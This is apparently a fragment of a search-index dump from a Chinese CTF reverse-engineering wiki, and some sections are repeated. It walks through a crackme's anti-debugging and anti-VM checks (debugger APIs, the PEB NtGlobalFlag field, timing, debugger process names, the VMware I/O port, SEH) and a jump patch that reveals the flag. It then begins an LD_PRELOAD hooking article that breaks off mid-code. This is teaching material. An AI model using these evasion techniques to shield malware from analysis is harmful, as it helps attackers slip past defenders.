\nedx\n\n\n\n\n\n\u66f4\u591a\u9605\u8bfb: \nE-cards don?t like virtual environments\n\n\nSEH\n\n\nv17\n \n=\n \n1\n;\n    \n\nv20\n \n=\n \n1\n;\n\n\nv12\n \n=\n \n0\n;\n\n\nv19\n \n=\n \n1\n \n/\n \n0\n;\n    \n// 9. SEH\n\n\nms_exc\n.\nregistration\n.\nTryLevel\n \n=\n \n-\n2\n;\n\n\nprintf\n(\nBut detected Debugged.\n\\n\n);\n\n\nexit\n(\n1\n);\n\n\n\n\n\n\u63a5\u4e0b\u6765\u8fd9\u4e00\u6bb5, \u5f88\u5947\u602a\u4e0d\u662f\u5417. \u8fd9\u91cc\nv19 = 1 / 0;\n\u660e\u663e\u662f\u4e0d\u5408\u5e38\u7406\u7684, \u4f1a\u4ea7\u751f\u4e00\u4e2a\u9664\u96f6\u5f02\u5e38. \u800c\u540e\u9762\u7684\nms_exc.registration.TryLevel = -2;\n\u8fd9\u662f\u89e3\u9664\u5f02\u5e38, \nTryLevel=TRYLEVEL_NONE (-2)\n . \u6765\u770b\u6c47\u7f16\u4ee3\u7801.\n\n\n.text:004015B8                 mov     [ebp+var_88], 1\n.text:004015C2                 mov     [ebp+var_7C], 1\n.text:004015C9                 mov     [ebp+var_9C], 0\n.text:004015D3                 mov     [ebp+ms_exc.registration.TryLevel], 0\n.text:004015DA                 mov     eax, [ebp+var_7C]\n.text:004015DD                 cdq\n.text:004015DE                 idiv    [ebp+var_9C]\n.text:004015E4                 mov     [ebp+var_80], eax\n.text:004015E7                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh\n.text:004015EE                 jmp     short loc_40160A\n\n\n\n\n\u5728\u8fd9\u91cc\u7684\nidiv [ebp+var_9C]\n\u89e6\u53d1\u5f02\u5e38\u540e\u5c31\u7531\u7a0b\u5e8f\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570\u63a5\u7ba1, \u800c\u5982\u679c\u6ca1\u6709\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u8bbe\u4e0b\u65ad\u70b9\u7684\u8bdd, \u7a0b\u5e8f\u5c31\u5bb9\u6613\u8dd1\u98de.\n\n\n\u83b7\u53d6flag\n\n\n\u4f46\u6574\u4e2a\u770b\u4e0b\u4e86. \u600e\u4e48\u611f\u89c9\u5173flag\u4e00\u70b9\u4e8b\u90fd\u6ca1\u6709\u4e86\u5462? \u8fd8\u6709\u6ca1\u6709\u8bb0\u8d77\u4e4b\u524d\u5728\u5b57\u7b26\u4e32\u7a97\u53e3\u770b\u5230\u7684\u7591\u4f3c\u662f\u90a3\u4e2a\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32? \u5b9e\u9645\u4e0a\u7531\u4e8eIDA\u53cd\u7f16\u8bd1\u7684\u9650\u5236, \u4f7f\u5f97\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u6b63\u786e. \u6bd4\u5982\u5728\u6700\u540e\u4e00\u6bb5\u7684\nprintf(\nBut detected Debugged.\\n\n);\n\u8fd9\u91cc, \u6211\u4eec\u6765\u770b\u5177\u4f53\u7684\u6c47\u7f16\u4ee3\u7801.\n\n\n.text:\n00401627\n                 \ncall\n    \nsub_4012E0\n\n\n.text:\n0040162\nC\n                 \nmovzx\n   \neax\n,\n \nax\n\n\n.text:\n0040162\nF\n                 \nmov\n     \n[\nebp\n+\nvar_A8\n],\n \neax\n\n\n.text:\n00401635\n                 \ncmp\n     \n[\nebp\n+\nvar_A8\n],\n \n0\n      \n//\n \n------\n\n\n.text:\n0040163\nC\n                 \njz\n      \nshort\n \nloc_401652\n     \n//\n \n------\n\n\n.text:\n0040163\nE\n                 \npush\n    \noffset\n \naButDetectedD_2\n \n; \nBut detected Debugged.\\n\n\n\n.text\n:\n00401643\n                 \ncall\n    \n_printf\n\n\n.text:\n00401648\n                 \nadd\n     \nesp\n,\n \n4\n\n\n.text:\n0040164\nB\n                 \npush\n    \n1\n               \n; int\n\n\n.text\n:\n0040164\nD\n                 \ncall\n    \n_exit\n\n\n\n\n\n\u5b9e\u9645\u4e0a\u8fd9\u4e00\u6bb5\u4ee3\u7801\u5e76\u6ca1\u6709\u88abIDA\u53cd\u7f16\u8bd1\u51fa\u6765. \u800c\nloc_401652\n\u4f4d\u7f6e\u5219\u662f\u4e00\u4e32\u4ee3\u7801, \u4eae\u70b9\u5728\u4e8e\u4f7f\u7528\u4e86\u4e00\u4e2a\nMessageBoxA\n\u7684\u51fd\u6570. \u800c\u4e14\u51fd\u6570\u53c2\u6570\u4e4b\u4e00\u5c31\u662f\u6211\u4eec\u7684\u5f85\u89e3\u5bc6flag. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8f93\u5165\nI have a pen.\n\u540e, \u5728\nif ( !v22 )\n\u8df3\u8f6c\u7684\u6c47\u7f16\u4ee3\u7801\u90e8\u5206, \u5c06\u5176\u624b\u52a8\u6539\u4e3a\u8df3\u8f6c\u5230flag\u89e3\u5bc6\u53ca\u5f39\u51fa\nmessagebox\n\u7684\u90e8\u5206\u8fd0\u884c, \u8ba9\u7a0b\u5e8f\u81ea\u5df1\u5e2e\u5fd9\u89e3\u5bc6\u5e76\u8f93\u51fa, \u5c31\u53ef\u4ee5\u4e86. \n\n\n\u64cd\u4f5c\u5982\u4e0b\u56fe\u6240\u793a:\n\n\n\n\n\u8fd9\u91cc\u662f\u8f93\u5165\nI have a pen.\n\u540e\u7684\u8df3\u8f6c\u90e8\u5206, \u56e0\u4e3a\u6b63\u5e38\u8df3\u8f6c\u5230\u7684\u90e8\u5206, \u5168\u662f\u4e00\u4e9b\u68c0\u6d4b\u8c03\u8bd5\u7684\u5185\u5bb9, \u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8df3\u5230\u4ee3\u7801\u89e3\u5bc6\u7684\u90e8\u5206. \u4e5f\u5c31\u662f\n00401663\n\u7684\u4f4d\u7f6e.\n\n\n\n\n\u5728\n00401663\n\u4ee5\u4e0a\u7684\nmov-cmp-jnz\n\u4e5f\u662f\u4e00\u4e2a\u9a8c\u8bc1\u90e8\u5206, \u5c31\u4e0d\u7ba1\u4e86, \u76f4\u63a5\u8df3\u5230\n00401663\n\u8fd9\u91cc\u7684\nmov ecx, 7\n\u8fd9\u91cc\u8fd0\u884c\u89e3\u5bc6\u4ee3\u7801, \u5e76\u987a\u7740\u6267\u884c\nMessageBoxA()\n\u5f39\u51fa\u6d88\u606f\u6846, \u62ff\u5230flag", 
            "title": "\u53cd\u8c03\u8bd5\u6280\u672f\u4f8b\u9898"
        }, 
        {
            "location": "/reverse/anti-debug/example/#_1", 
            "text": "printf ( Input password  );  v3   =   ( FILE   * ) sub_40223D ();  fgets ( v23 ,   64 ,   v3 );  strcpy ( v21 ,   I have a pen. );    v22   =   strncmp ( v23 ,   v21 ,   0xDu );   // 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32  if   (   ! v22   )    { \n     ......  }   \u8fd9\u91cc\u5c31\u662f\u8f93\u51fa Input password  . \u7136\u540e\u7528 fgets() \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32, \u5c06 I have a pen. \u590d\u5236\u5230 v21 \u7684\u7f13\u51b2\u533a\u4e2d, \u7136\u540e\u7528 strncmp \u6bd4\u5bf9\u7528\u6237\u8f93\u5165\u4e0e I have a pen. \u7684\u5185\u5bb9, \u5e76\u5c06\u6bd4\u8f83\u7ed3\u679c\u8fd4\u56de\u7ed9 v22 . \u4ee5\u4e0b\u4f1a\u6839\u636e v22 , \u4e5f\u5c31\u662f\u6839\u636e\u8f93\u5165\u7684 password \u662f\u5426\u6b63\u786e, \u800c\u8fdb\u884c\u8df3\u8f6c.", 
            "title": "\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32"
        }, 
        {
            "location": "/reverse/anti-debug/example/#isdebuggerpresent", 
            "text": "puts ( Your password is correct. );  if   (   IsDebuggerPresent ()   ==   1   )       // 2. API: IsDebuggerPresent()  { \n     puts ( But detected debugger! ); \n     exit ( 1 );  }   \u663e\u7136, \u8f93\u5165\u7684 password \u6b63\u786e, \u5c31\u4f1a\u8f93\u51fa\u63d0\u793a Your password is correct. . ??? \u4e0d\u89c9\u5f97\u5947\u602a\u5417. \u96be\u9053 I have a pen. \u5c31\u662f\u6211\u4eec\u7684flag\u4e86\u5417? \u4e0d\u4e0d\u4e0d\u5f53\u7136\u4e0d\u662f. \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u9677\u9631, \u65e2\u7136\u4f60\u77e5\u9053\u4e86 I have a pen. \u90a3\u4e48\u5c31\u80af\u5b9a\u6709\u901a\u8fc7\u67d0\u79cd\u9006\u5411\u624b\u6bb5\u5728\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790. \u6240\u4ee5\u63a5\u4e0b\u6765\u7684\u90e8\u5206\u5c31\u5f00\u59cb\u8fdb\u884c\u4e00\u4e9b\u53cd\u8c03\u8bd5\u6216\u5176\u4ed6\u7684\u68c0\u6d4b\u624b\u6bb5(\u5b9e\u9645\u4e2d\u4e5f\u53ef\u4ee5\u51fa\u73b0\u8fd9\u6837\u7684\u9677\u9631).  \u4e00\u5f00\u59cb\u7684\u662f IsDebuggerPresent() , \u6839\u636e\u8fd4\u56de\u7ed3\u679c\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5.\u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b  IsDebuggerPresent()  \u7bc7", 
            "title": "IsDebuggerPresent()"
        }, 
        {
            "location": "/reverse/anti-debug/example/#ntglobalflag", 
            "text": "\u63a5\u4e0b\u6765\u662f\u68c0\u6d4b NtGlobalFlag \u8fd9\u4e2a\u5b57\u6bb5\u7684\u6807\u5fd7\u4f4d. \u901a\u8fc7\u68c0\u6d4bPEB\u7684\u5b57\u6bb5\u503c\u662f\u5426\u4e3a 0x70 \u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b  NtGlobalFlag  \u7bc7  if   (   sub_401120 ()   ==   0x70   )           // 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag()  { \n     puts ( But detected NtGlobalFlag! ); \n     exit ( 1 );  }   \u90a3\u6211\u4eec\u6765\u7b80\u5355\u770b\u4e00\u4e0b sub_401120() \u597d\u4e86  int   sub_401120 ()  { \n   return   * ( _DWORD   * )( __readfsdword ( 48 )   +   0x68 )     0x70 ;  }   0x68 \u662fPEB\u7684 NtGlobalFlag \u5b57\u6bb5\u5bf9\u5e94\u504f\u79fb\u503c.  0x70 \u662f FLG_HEAP_ENABLE_TAIL_CHECK (0x10) ,  FLG_HEAP_ENABLE_FREE_CHECK (0x20)  \u548c FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u8fd9\u4e09\u4e2a\u6807\u5fd7", 
            "title": "NtGlobalFlag"
        }, 
        {
            "location": "/reverse/anti-debug/example/#checkremotedebuggerpresent", 
            "text": "/*  BOOL WINAPI CheckRemoteDebuggerPresent(   *    _In_    HANDLE hProcess,   *    _Inout_ PBOOL  pbDebuggerPresent   *  );   */  v4   =   GetCurrentProcess ();  CheckRemoteDebuggerPresent ( v4 ,   pbDebuggerPresent );  if   (   pbDebuggerPresent   )              // 4. API: CheckRemoteDebuggerPresent()  { \n     printf ( But detected remotedebug. \\n ); \n     exit ( 1 );  }  \n\u8fd9\u91cc\u6211\u987a\u4fbf\u5728\u6ce8\u91ca\u91cc\u5217\u51fa\u4e86 CheckRemoteDebuggerPresent() \u8fd9\u4e2aAPI\u7684\u51fd\u6570\u539f\u578b. \u5982\u679c\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728, \u4f1a\u5c06 pbDebuggerPresent \u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c. \u6839\u636e\u5176\u503c\u68c0\u6d4b\u8c03\u8bd5\u5668( CheckRemoteDebuggerPresent()  \u7bc7)", 
            "title": "CheckRemoteDebuggerPresent"
        }, 
        {
            "location": "/reverse/anti-debug/example/#_2", 
            "text": "v13   =   GetTickCount ();  for   (   i   =   0 ;   i   ==   100 ;   ++ i   )      // \u7761\u7720 \n     Sleep ( 1u );  v16   =   1000 ;  if   (   GetTickCount ()   -   v13     1000   )    // 5. \u68c0\u6d4b\u65f6\u95f4\u5dee  { \n     printf ( But detected debug. \\n ); \n     exit ( 1 );  }   GetTickCount \u4f1a\u8fd4\u56de\u542f\u52a8\u5230\u73b0\u5728\u7684\u6beb\u79d2\u6570, \u5faa\u73af\u91cc\u5149\u662f sleep(1) \u5c31\u8fdb\u884c\u4e86100\u6b21, \u4e5f\u5c31\u662f100\u6beb\u79d2. \u4e24\u6b21\u5f97\u5230\u7684\u65f6\u95f4\u4f5c\u5dee\u5982\u679c\u5927\u4e8e1000\u6beb\u79d2, \u65f6\u5dee\u660e\u663e\u5927\u4e8e\u6240\u8017\u7684\u65f6\u95f4, \u4e5f\u5c31\u95f4\u63a5\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5.", 
            "title": "\u65f6\u95f4\u5dee\u68c0\u6d4b"
        }, 
        {
            "location": "/reverse/anti-debug/example/#processmonitor", 
            "text": "lpFileName   =   \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger ;  if   (   CreateFileA ( \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger ,   0x80000000 ,   7u ,   0 ,   3u ,   0x80u ,   0 )   !=   ( HANDLE ) - 1   )  { \n     printf ( But detect %s. \\n ,   lpFileName );        // 6. \u68c0\u6d4bProcessMonitor \n     exit ( 1 );  }   \u8fd9\u91cc\u901a\u8fc7\u68c0\u6d4b\u8bbe\u5907\u6587\u4ef6 \\\\\\\\.\\\\Global\\\\ProcmonDebugLogger \u6765\u68c0\u6d4b ProcessMonitor", 
            "title": "ProcessMonitor"
        }, 
        {
            "location": "/reverse/anti-debug/example/#_3", 
            "text": "\u8fd9\u91cc\u901a\u8fc7\u6267\u884c sub_401130() \u51fd\u6570\u6765\u68c0\u6d4b\u8fdb\u7a0b, \u5e76\u6839\u636e\u68c0\u6d4b\u5230\u7684\u4e0d\u540c\u8fdb\u7a0b, \u8fd4\u56de\u76f8\u5e94\u7684\u503c.   v11   =   sub_401130 ();       // 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b   if   (   v11   ==   1   )  { \n     printf ( But detected Ollydbg. \\n ); \n     exit ( 1 );  }  if   (   v11   ==   2   )  { \n     printf ( But detected ImmunityDebugger. \\n ); \n     exit ( 1 );  }  if   (   v11   ==   3   )  { \n     printf ( But detected IDA. \\n ); \n     exit ( 1 );  }  if   (   v11   ==   4   )  { \n     printf ( But detected WireShark. \\n ); \n     exit ( 1 );  }   \u6211\u4eec\u5c31\u6765\u770b\u4e00\u4e0b sub_401130() \u51fd\u6570  signed   int   sub_401130 ()  { \n   PROCESSENTRY32   pe ;   // [sp+0h] [bp-138h]@1 \n   HANDLE   hSnapshot ;   // [sp+130h] [bp-8h]@1 \n   int   i ;   // [sp+134h] [bp-4h]@1 \n\n   pe . dwSize   =   296 ; \n   memset ( pe . cntUsage ,   0 ,   0x124u ); \n   hSnapshot   =   CreateToolhelp32Snapshot ( 2u ,   0 ); \n   for   (   i   =   Process32First ( hSnapshot ,   pe );   i   ==   1 ;   i   =   Process32Next ( hSnapshot ,   pe )   ) \n   { \n     if   (   ! _stricmp ( pe . szExeFile ,   ollydbg.exe )   ) \n       return   1 ; \n     if   (   ! _stricmp ( pe . szExeFile ,   ImmunityDebugger.exe )   ) \n       return   2 ; \n     if   (   ! _stricmp ( pe . szExeFile ,   idaq.exe )   ) \n       return   3 ; \n     if   (   ! _stricmp ( pe . szExeFile ,   Wireshark.exe )   ) \n       return   4 ; \n   } \n   return   0 ;  }   \u8fd9\u91cc\u4f7f\u7528\u4e86API:  CreateToolhelp32Snapshot \u6765\u83b7\u53d6\u5f53\u524d\u7684\u8fdb\u7a0b\u4fe1\u606f. \u5e76\u5728for\u5faa\u73af\u91cc\u4f9d\u6b21\u6bd4\u5bf9. \u5982\u679c\u627e\u5230\u6307\u5b9a\u7684\u8fdb\u7a0b\u540d, \u5c31\u76f4\u63a5\u8fd4\u56de\u76f8\u5e94\u7684\u503c. \u7136\u540e\u6839\u636e\u8fd4\u56de\u503c\u8df3\u8f6c\u5230\u4e0d\u540c\u7684\u5206\u652f\u91cc.", 
            "title": "\u68c0\u6d4b\u8fdb\u7a0b\u540d"
        }, 
        {
            "location": "/reverse/anti-debug/example/#vmware", 
            "text": "\u68c0\u6d4bVMware\u4e5f\u662f\u68c0\u6d4b\u4e00\u4e9b\u7279\u5f81. \u6839\u636e\u68c0\u6d4b\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad.  if   (   sub_401240 ()   ==   1   )      // 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b  { \n     printf ( But detected VMware. \\n ); \n     exit ( 1 );  }   \u6765\u770b sub_401240() \u51fd\u6570.  signed   int   sub_401240 ()  { \n   unsigned   __int32   v0 ;   // eax@1 \n\n   v0   =   __indword ( 0x5658u ); \n   return   1 ;  }   \u8fd9\u662fVMware\u7684\u4e00\u4e2a\"\u540e\u95e8\"I/O\u7aef\u53e3,  0x5658 =  VX . \u5982\u679c\u7a0b\u5e8f\u5728VMware\u5185\u8fd0\u884c, \u7a0b\u5e8f\u4f7f\u7528 In \u6307\u4ee4\u901a\u8fc7 0x5658 \u7aef\u53e3\u8bfb\u53d6\u6570\u636e\u65f6,  EBX \u5bc4\u5b58\u5668\u7684\u503c\u5c31\u4f1a\u53d8\u4e3a 0x564D5868 ( 0x564D5868 ==  VMXh )  \u770bIDA\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u5f88\u76f4\u89c2\u5730\u4f53\u73b0\u8fd9\u70b9, \u6211\u4eec\u770b\u6c47\u7f16\u4ee3\u7801\u5c31\u6e05\u695a\u4e86  .text: 0040127 A                   push      edx  .text: 0040127 B                   push      ecx  .text: 0040127 C                   push      ebx  .text: 0040127 D                   mov       eax ,   564 D5868h     //    ------  .text: 00401282                   mov       ebx ,   0  .text: 00401287                   mov       ecx ,   0 Ah  .text: 0040128 C                   mov       edx ,   5658 h     //    ------  .text: 00401291                   in        eax ,   dx  .text: 00401292                   pop       ebx  .text: 00401293                   pop       ecx  .text: 00401294                   pop       edx   \u66f4\u591a\u9605\u8bfb:  E-cards don?t like virtual environments", 
            "title": "\u68c0\u6d4bVMware"
        }, 
        {
            "location": "/reverse/anti-debug/example/#seh", 
            "text": "v17   =   1 ;      v20   =   1 ;  v12   =   0 ;  v19   =   1   /   0 ;      // 9. SEH  ms_exc . registration . TryLevel   =   - 2 ;  printf ( But detected Debugged. \\n );  exit ( 1 );   \u63a5\u4e0b\u6765\u8fd9\u4e00\u6bb5, \u5f88\u5947\u602a\u4e0d\u662f\u5417. \u8fd9\u91cc v19 = 1 / 0; \u660e\u663e\u662f\u4e0d\u5408\u5e38\u7406\u7684, \u4f1a\u4ea7\u751f\u4e00\u4e2a\u9664\u96f6\u5f02\u5e38. \u800c\u540e\u9762\u7684 ms_exc.registration.TryLevel = -2; \u8fd9\u662f\u89e3\u9664\u5f02\u5e38,  TryLevel=TRYLEVEL_NONE (-2)  . \u6765\u770b\u6c47\u7f16\u4ee3\u7801.  .text:004015B8                 mov     [ebp+var_88], 1\n.text:004015C2                 mov     [ebp+var_7C], 1\n.text:004015C9                 mov     [ebp+var_9C], 0\n.text:004015D3                 mov     [ebp+ms_exc.registration.TryLevel], 0\n.text:004015DA                 mov     eax, [ebp+var_7C]\n.text:004015DD                 cdq\n.text:004015DE                 idiv    [ebp+var_9C]\n.text:004015E4                 mov     [ebp+var_80], eax\n.text:004015E7                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh\n.text:004015EE                 jmp     short loc_40160A  \u5728\u8fd9\u91cc\u7684 idiv [ebp+var_9C] \u89e6\u53d1\u5f02\u5e38\u540e\u5c31\u7531\u7a0b\u5e8f\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570\u63a5\u7ba1, \u800c\u5982\u679c\u6ca1\u6709\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5165\u53e3\u8bbe\u4e0b\u65ad\u70b9\u7684\u8bdd, \u7a0b\u5e8f\u5c31\u5bb9\u6613\u8dd1\u98de.", 
            "title": "SEH"
        }, 
        {
            "location": "/reverse/anti-debug/example/#flag", 
            "text": "\u4f46\u6574\u4e2a\u770b\u4e0b\u4e86. \u600e\u4e48\u611f\u89c9\u5173flag\u4e00\u70b9\u4e8b\u90fd\u6ca1\u6709\u4e86\u5462? \u8fd8\u6709\u6ca1\u6709\u8bb0\u8d77\u4e4b\u524d\u5728\u5b57\u7b26\u4e32\u7a97\u53e3\u770b\u5230\u7684\u7591\u4f3c\u662f\u90a3\u4e2a\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32? \u5b9e\u9645\u4e0a\u7531\u4e8eIDA\u53cd\u7f16\u8bd1\u7684\u9650\u5236, \u4f7f\u5f97\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u6b63\u786e. \u6bd4\u5982\u5728\u6700\u540e\u4e00\u6bb5\u7684 printf( But detected Debugged.\\n ); \u8fd9\u91cc, \u6211\u4eec\u6765\u770b\u5177\u4f53\u7684\u6c47\u7f16\u4ee3\u7801.  .text: 00401627                   call      sub_4012E0  .text: 0040162 C                   movzx     eax ,   ax  .text: 0040162 F                   mov       [ ebp + var_A8 ],   eax  .text: 00401635                   cmp       [ ebp + var_A8 ],   0        //   ------  .text: 0040163 C                   jz        short   loc_401652       //   ------  .text: 0040163 E                   push      offset   aButDetectedD_2   ;  But detected Debugged.\\n  .text : 00401643                   call      _printf  .text: 00401648                   add       esp ,   4  .text: 0040164 B                   push      1                 ; int  .text : 0040164 D                   call      _exit   \u5b9e\u9645\u4e0a\u8fd9\u4e00\u6bb5\u4ee3\u7801\u5e76\u6ca1\u6709\u88abIDA\u53cd\u7f16\u8bd1\u51fa\u6765. \u800c loc_401652 \u4f4d\u7f6e\u5219\u662f\u4e00\u4e32\u4ee3\u7801, \u4eae\u70b9\u5728\u4e8e\u4f7f\u7528\u4e86\u4e00\u4e2a MessageBoxA \u7684\u51fd\u6570. \u800c\u4e14\u51fd\u6570\u53c2\u6570\u4e4b\u4e00\u5c31\u662f\u6211\u4eec\u7684\u5f85\u89e3\u5bc6flag. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8f93\u5165 I have a pen. \u540e, \u5728 if ( !v22 ) \u8df3\u8f6c\u7684\u6c47\u7f16\u4ee3\u7801\u90e8\u5206, \u5c06\u5176\u624b\u52a8\u6539\u4e3a\u8df3\u8f6c\u5230flag\u89e3\u5bc6\u53ca\u5f39\u51fa messagebox \u7684\u90e8\u5206\u8fd0\u884c, \u8ba9\u7a0b\u5e8f\u81ea\u5df1\u5e2e\u5fd9\u89e3\u5bc6\u5e76\u8f93\u51fa, \u5c31\u53ef\u4ee5\u4e86.   \u64cd\u4f5c\u5982\u4e0b\u56fe\u6240\u793a:   \u8fd9\u91cc\u662f\u8f93\u5165 I have a pen. \u540e\u7684\u8df3\u8f6c\u90e8\u5206, \u56e0\u4e3a\u6b63\u5e38\u8df3\u8f6c\u5230\u7684\u90e8\u5206, \u5168\u662f\u4e00\u4e9b\u68c0\u6d4b\u8c03\u8bd5\u7684\u5185\u5bb9, \u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8df3\u5230\u4ee3\u7801\u89e3\u5bc6\u7684\u90e8\u5206. \u4e5f\u5c31\u662f 00401663 \u7684\u4f4d\u7f6e.   \u5728 00401663 \u4ee5\u4e0a\u7684 mov-cmp-jnz \u4e5f\u662f\u4e00\u4e2a\u9a8c\u8bc1\u90e8\u5206, \u5c31\u4e0d\u7ba1\u4e86, \u76f4\u63a5\u8df3\u5230 00401663 \u8fd9\u91cc\u7684 mov ecx, 7 \u8fd9\u91cc\u8fd0\u884c\u89e3\u5bc6\u4ee3\u7801, \u5e76\u987a\u7740\u6267\u884c MessageBoxA() \u5f39\u51fa\u6d88\u606f\u6846, \u62ff\u5230flag", 
            "title": "\u83b7\u53d6flag"
        }, 
        {
            "location": "/reverse/linux/ld_preload/", 
            "text": "\u539f\u7406\n\n\n\u6b63\u5e38\u60c5\u51b5\u4e0b, Linux \u52a8\u6001\u52a0\u8f7d\u5668\nld-linux\n(\u89c1man\u624b\u518cld-linux(8))\u4f1a\u641c\u5bfb\u5e76\u88c5\u8f7d\u7a0b\u5e8f\u6240\u9700\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6, \u800c\nLD_PRELOAD\n\u662f\u4e00\u4e2a\u53ef\u9009\u7684\u73af\u5883\u53d8\u91cf, \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u5411\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84. \u52a0\u8f7d\u5668\u4f1a\u5148\u4e8eC\u8bed\u8a00\u8fd0\u884c\u5e93\u4e4b\u524d\u8f7d\u5165\nLD_PRELOAD\n\u6307\u5b9a\u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u9884\u88c5\u8f7d(\npreload\n)\u3002\n\n\n\u9884\u88c5\u8f7d\u610f\u5473\u7740\u4f1a\u5b83\u7684\u51fd\u6570\u4f1a\u6bd4\u5176\u4ed6\u5e93\u6587\u4ef6\u4e2d\u7684\u540c\u540d\u51fd\u6570\u5148\u4e8e\u8c03\u7528, \u4e5f\u5c31\u4f7f\u5f97\u5e93\u51fd\u6570\u53ef\u4ee5\u88ab\u963b\u622a\u6216\u66ff\u6362\u6389. \u591a\u4e2a\u5171\u4eab\u94fe\u63a5\u5e93\u6587\u4ef6\u7684\u8def\u5f84\u53ef\u4ee5\u7528\n\u5192\u53f7\n\u6216\n\u7a7a\u683c\n\u8fdb\u884c\u533a\u5206. \u663e\u7136\u4e0d\u4f1a\u53d7\u5230\nLD_PRELOAD\n\u5f71\u54cd\u7684\u4e5f\u5c31\u53ea\u6709\u90a3\u4e9b\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u4e86.\n\n\n\u5f53\u7136\u4e3a\u907f\u514d\u7528\u4e8e\u6076\u610f\u653b\u51fb, \u5728\nruid != euid\n\u7684\u60c5\u51b5\u4e0b\u52a0\u8f7d\u5668\u662f\u4e0d\u4f1a\u4f7f\u7528\nLD_PRELOAD\n\u8fdb\u884c\u9884\u88c5\u8f7d\u7684. \n\n\n\u66f4\u591a\u9605\u8bfb: \nhttps://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4\n\n\n\u4f8b\u9898\n\n\n\u4e0b\u9762\u4ee52014\u5e74\nHack In The Box Amsterdam: Bin 100\n\u4e3a\u4f8b. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: \nhitb_bin100.elf\n\n\n\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7684ELF\u6587\u4ef6. \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a:\n\n\n\n\n\u7a0b\u5e8f\u4f3c\u4e4e\u5728\u4e00\u76f4\u6253\u5370\u7740\u4e00\u4e9b\u53e5\u5b50. \u5e76\u4e14\u6ca1\u6709\u505c\u6b62\u4e0b\u6765\u7684\u8ff9\u8c61. \u6211\u4eec\u5c31\u7528IDA\u6253\u5f00\u6765\u770b\u4e00\u4e0b. \u9996\u5148\u6309\u4e0b\nShift+F12\n\u67e5\u627e\u5b57\u7b26\u4e32. \n\n\n\n\n\u663e\u7136, \u9664\u5f00\u4e00\u76f4\u5728\u6253\u5370\u7684\u53e5\u5b50\u5916, \u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u5b57\u7b26\u4e32:\n\n\n.rodata:0000000000400A53 00000006 C KEY: \n.rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE\nS YOUR FLAG: \n\n\n\n\n\u6211\u4eec\u6839\u636e\nOK YOU WIN. HERE'S YOUR FLAG:\n\u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u4ee3\u7801\u5904(\u6211\u5220\u53bb\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4ee3\u7801). \n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nqmemcpy\n(\nv23\n,\n \nunk_400A7E\n,\n \nsizeof\n(\nv23\n));\n\n  \nv3\n \n=\n \nv22\n;\n\n  \nfor\n \n(\n \ni\n \n=\n \n9LL\n;\n \ni\n;\n \n--\ni\n \n)\n\n  \n{\n\n    \n*\n(\n_DWORD\n \n*\n)\nv3\n \n=\n \n0\n;\n\n    \nv3\n \n+=\n \n4\n;\n\n  \n}\n\n  \nv20\n \n=\n 